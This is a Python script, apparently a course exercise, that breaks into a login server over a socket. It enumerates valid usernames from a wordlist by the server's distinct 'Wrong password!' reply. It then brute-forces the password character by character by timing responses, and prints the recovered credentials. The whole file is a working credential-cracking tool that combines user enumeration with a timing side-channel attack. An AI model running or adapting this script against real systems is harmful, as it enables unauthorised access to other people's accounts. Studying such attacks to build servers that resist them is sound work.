import socket
import json
import argparse
import string
import time

parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()


def gen_id():
    for name in open('logins.txt', 'r'):
        yield name.strip()


characters = string.ascii_letters + string.digits

with socket.socket() as client:
    client.connect((args.host, args.port))
    for login in gen_id():
        ms_json = json.dumps({
            'login': login,
            'password': ' '
        })
        client.send(ms_json.encode())
        res = json.loads(client.recv(1024).decode())
        if res['result'] == 'Wrong password!':
            break
    password = ''
    count = 0
    # try:
    while True:
        for letter in characters:
            ms_json = json.dumps({
                'login': login,
                'password': f'{password + letter}'
            })
            start = time.perf_counter()
            client.send(ms_json.encode())
            res = json.loads(client.recv(1024).decode())
            end = time.perf_counter()
            if end - start > 0.1:
                password += letter
            if res['result'] == "Connection success!":
                print(json.dumps({
                    'login': login,
                    'password': password + letter
                }))
                break

        if res['result'] == "Connection success!":
            break